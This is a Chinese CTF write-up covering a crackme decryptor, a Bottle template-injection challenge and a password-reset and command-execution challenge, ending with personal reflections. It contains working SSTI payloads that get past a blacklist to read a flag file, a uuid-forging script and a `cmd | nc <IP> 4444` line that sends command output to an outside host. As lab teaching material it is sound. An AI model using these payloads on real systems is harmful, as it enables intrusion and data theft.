    模拟sub_410100函数中的解密过程
    """
    print("\n=== 模拟sub_410100函数的解密过程 ===")
    print(f"传入的加密字符串: \"{encrypted_str}\"")

    # 调用解密函数
    decrypted = decrypt_string(encrypted_str)

    print(f"解密后的字符串: \"{decrypted}\"")

    return decrypted

def test_individual_strings():
    """
    测试每个单独字符串的解密结果
    """
    print("\n=== 单独字符串解密测试 ===")

    test_strings = [
        ("KJKDS",   1),  # 第1段（奇数段）
        ("GzR6`",   2),  # 第2段（偶数段）
        ("bsd5s",   3),  # 第3段（奇数段）
        ("1q`0t",   4),  # 第4段（偶数段）
        ("^wdsx",   5),  # 第5段（奇数段）
        ("`b1mw",   6),  # 第6段（偶数段）
        ("2oh4mu|", 7)   # 第7段（奇数段）
    ]

    print("使用标准算法（奇数位+1，偶数位-1）:")
    for s, segment_num in test_strings:
        decrypted = decrypt_string(s)
        segment_type = "奇数段" if segment_num % 2 == 1 else "偶数段"
        print(f"  第{segment_num}段({segment_type}): \"{s}\" -> \"{decrypted}\"")

def test_mixed_algorithm():
    """
    使用混合算法：奇数段用standard，偶数段用reverse
    """
    print("\n=== 混合算法测试 ===")

    segments = [
        ("KJKDS",   1),  # 第1段（奇数段）- standard
        ("GzR6`",   2),  # 第2段（偶数段）- reverse
        ("bsd5s",   3),  # 第3段（奇数段）- standard
        ("1q`0t",   4),  # 第4段（偶数段）- reverse
        ("^wdsx",   5),  # 第5段（奇数段）- standard
        ("`b1mw",   6),  # 第6段（偶数段）- reverse
        ("2oh4mu|", 7)   # 第7段（奇数段）- standard
    ]

    print("使用混合算法（奇数段：standard，偶数段：reverse）:")
    decrypted_segments = []
    for s, segment_num in segments:
        if segment_num % 2 == 1:  # 奇数段
            algorithm = "standard"
        else:  # 偶数段
            algorithm = "reverse"

        decrypted = decrypt_string(s, algorithm)
        segment_type = "奇数段" if segment_num % 2 == 1 else "偶数段"
        print(f"  第{segment_num}段({segment_type}, {algorithm}): \"{s}\" -> \"{decrypted}\"")
        decrypted_segments.append(decrypted)

    # 重建完整的flag
    complete_flag = ''.join(decrypted_segments)
    print(f"\n=== 完整flag重建 ===")
    print(f"完整flag: \"{complete_flag}\"")

    return complete_flag

def main():
    """
    主函数：完整模拟整个过程
    """
    print("CTF Crackme 解密模拟器")
    print("=" * 50)

    # 第一步：模拟sub_40EE30中的字符串拼接和a1[14]赋值
    a1_14_encrypted, encrypted_strings = simulate_sub_40EE30()

    # 第二步：模拟sub_410100中的解密过程
    a1_14_decrypted = simulate_sub_410100(a1_14_encrypted)

    # 第三步：分析结果
    print("\n=== 结果分析 ===")
    print(f"最终解密结果: \"{a1_14_decrypted}\"")

    # 检查是否包含CTF相关的特征
    if "LILCT" in a1_14_decrypted:
        print("✓ 发现CTF特征: 'LILCT' (可能是LIL CTF的缩写)")

    if "flag" in a1_14_decrypted.lower() or "{" in a1_14_decrypted or "}" in a1_14_decrypted:
        print("✓ 发现可能的flag格式特征")

    print(f"\n字符串长度: {len(a1_14_decrypted)}")

    # 显示字符分析
    print("\n=== 字符分析 ===")
    print("原始字符 -> 解密后字符:")
    for i, (enc_char, dec_char) in enumerate(zip(a1_14_encrypted, a1_14_decrypted)):
        operation = "+1" if i % 2 == 0 else "-1"
        print(f"  {enc_char} ({ord(enc_char):3d}) -> {dec_char} ({ord(dec_char):3d}) [{operation}]")

if __name__ == "__main__":
    main()

    # 可选：运行单独字符串测试
    print("\n" + "="*50)
    test_individual_strings()

    # 运行混合算法测试
    print("\n" + "="*50)
    correct_flag = test_mixed_algorithm()

    print("\n" + "="*50)
    print("=== 总结 ===")
    print(f"发现正确的解密方法：")
    print(f"- 奇数段（1,3,5,7）：使用standard算法（奇数位+1，偶数位-1）")
    print(f"- 偶数段（2,4,6）：使用reverse算法（奇数位-1，偶数位+1）")
    print(f"正确flag：\"{correct_flag}\"")
```

## Web

### ez_bottle

给了源代码，交给 Gemini 一通分析，指出这是一个文件上传题目，主要漏洞是*服务器端模板注入 (SSTI)*漏洞，也就是利用模板渲染的漏洞。

提示我们去看 `def view_file(md5, filename)`，指出只有我们打开的文件才会被 `BLACK_DICT` 检测。

#### 初见

在 Copilot 的行间补全下完成了一个 Powershell 的尝试脚本：

```powershell
$url = 'http://challenge.xinshi.fun:48459/upload'
$filePath = '.\try.zip'

Compress-Archive -Path "exp.txt" -DestinationPath "try.zip"  -Force
$file = Get-Item -Path $filePath

Write-Host "正在上传文件: $($file.Name)"
# 构建 multipart 哈希表
# 'file' 是服务器端接收文件的字段名
$multipart = @{
    'file' = $file
}
try {
    # Invoke-RestMethod 会自动处理文件的二进制内容和文件名
    $response = Invoke-RestMethod -Method Post -Uri $url -Form $multipart
    Write-Host "文件上传成功！"
    Write-Host "服务器响应: $($response | Out-String)"
} catch {
    Write-Host "文件上传失败。"
    Write-Host "错误信息: $_"
    try {
        $errorResponse = $_.Exception.Response.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($errorResponse)
        $responseBody = $reader.ReadToEnd()
        Write-Host "服务器响应体: $responseBody"
    }
}
```

然后开始了一些奇怪的尝试，比如发现单行会返回：

```
Error rendering template: Template 'xxx' not found.
```

变成寻找对应的模板文件。

而多行会把它当作模板文本渲染。

#### 误区：以为是多文件上传题目 or 文件包含

最开始的想法是，既然是上传 zip，且只有我们打开的文件才会被 `BLACK_DICT` 检测，那么就是多文件协作的题目了。

而 Gemini 也告诉我 jinja 有 `%include()` 的语法。（我一开始也以为用的是 `jinja2`）

于是试了半天发现不能识别到模板，应该是指定了对应的 `template` 文件夹。

最后不死心试了试 `%include('/flag')`

~这不是和上面那个同一个原因不行吗~

_这个想法告吹了。_

#### 正解：读 Bottle 的文档

AI 用多了人总会忘记传统的搜索引擎，互联网的传统信息收集方法。

Gemini 已经告诉我用的是 Bottle 框架了（呃一开始我还真不相信有叫这个名字的后端服务器框架没想到真有），只要动动手指就能看到 [SimpleTemplate 模板引擎]("https://www.osgeo.cn/bottle/stpl.html") 这篇文章。

我们可以使用 `%` 直接执行 python 代码。

接下来事情就简单了，在 Gemini 的指引下（我似乎变成了给 AI 提供更少噪音的中间件），我通过：`% print(locals())` 寻找可用的工具：

```
>>> from bottle import template
>>> template('% print(locals())')
{...}
```

由于我看不到回显，所以 Gemini 告诉我利用错误信息 `raise Exception()` 传递有效信息。

Gemini 指出内建函数 `'__builtins__': {'__name__': 'builtins', ..., 'open': <built-in function open>, ...}` 的重要意义并通过遍历越过 `[]` 的黑名单，通过字符串拼接越过 `open` 的黑名单：

```
# The final payload
% for v in locals().values():
%   if isinstance(v, dict) and 'o' + 'pen' in v:
%     flag_content = v['o' + 'pen']('/flag').read()
%     raise Exception(flag_content)
%     break
%   end
% end
```

但是经过我粗暴的问讯，上下文已经充满了噪音，它已经忘记 `:` 字符也已经被 Block 了，所以我重新开了一个对话，给予必要少量的信息，得到：

```
# The final payload
% result = [v['o' + 'pen']('/flag').read() for v in locals().values() if isinstance(v, dict) and 'o' + 'pen' in v]
% raise Exception(result)
```

就此这题成功解出。

### Ekko_note

阅读源码后 Gemini 直接给出了很接近正确答案的思路：先根据uuid的不变性在找回密码界面输入token更改admin密码，再在设置页面更改 time_api 为一个返回 2066 年以后时间的 url，最后可以开始任意执行了。

#### 第一步 uuid

Gemini 也不清楚 python3.14 的 uuid8 的生成和 random 有关，但是经过实验是的：

果然 AI 对时效性很强的东西的误差会更明显。

所以我们的脚本：

```python
import random
import uuid

SERVER_START_TIME = 1755255921.956183

def padding(input_string):
    """
    和服务器上完全一样的 padding 函数。
    """
    byte_string = input_string.encode('utf-8')
    if len(byte_string) > 6:
        byte_string = byte_string[:6]
    padded_byte_string = byte_string.ljust(6, b'\x00')
    padded_int = int.from_bytes(padded_byte_string, byteorder='big')
    return padded_int

random.seed(SERVER_START_TIME)
print(uuid.uuid8(a=padding('admin')))
```

其中 `/server_info` 是我们获取 `SERVER_START_TIME` 的途径。

#### 第二步 time_api

后面检查源代码，发现只需要 `datetime_str = data.get('date')` 即可：

```python
{
  "date": "2067-08-15 20:17:09",
}
```

粘贴给 https://api.npoint.io/ 就可以了。

#### 第三步 任意执行 出网

现在我们获得了任意执行的能力，但是只能输入，看不到输出。

咨询 Gemini，在服务器上使用 `cmd | nc <IP> 4444 ` 出网。

在有公网 IP 的机器上使用 `nc -lvnp 4444` 监听。

# 感想

## AI 与网络安全

虽然我很菜，但是 AI 确实对网安工作的效率有极大的提升效果。

绝对不能拘泥于古典编程，同时也不能完全靠 AI 失去了自己学习的机会。

## 入门 PWN

Reverse 和 PWN，与计算机基础和编译原理关联比较大。我希望学习他们，更好地理解计算机基础和编译原理。

同时，我也感受到 CTF 这种比赛对我的正向影响。

面对一些“点进去自动下载原神”的恶作剧，一些类似哈基密文、幻影坦克的整活项目，我也不再抓瞎，而是能够尝试理解他们的原理。

面对一些破解xxx软件的方法，我也能够看懂了，~以后可以自己破解软件学习了~

最重要的是精神上的，我不再有那么坚定的“xxx做不到”的思想了。

Get Hans Dirty，CTF 的很多信息都要靠尝试和报错获取。这条规则在 Earth Online 这个游戏也适用。我尝试与更多样的人沟通，尝试不再那么小心翼翼内敛，而是尝试大胆与人沟通，逐渐尝试把内心的想法说出来。

更别说，受到了前辈的鼓舞。

这个 PWN，我学定了。

## GDB-MCP 的可行性

IDA-Pro-MCP 大大提高了静态分析的效率。

但是动态调试还是没有一款合适的 MCP ……

也许，我能做这一件事？

## 感谢师傅

感谢带我入门的前辈师傅，我原本以为安全的世界离我很远。我原本以为计算机的世界只有开发。是你们让我发现计算机世界的缤纷，还有这么多我不曾思考过，不曾重视过却在计算机世界里面扮演如此重要角色的方向值得研究……
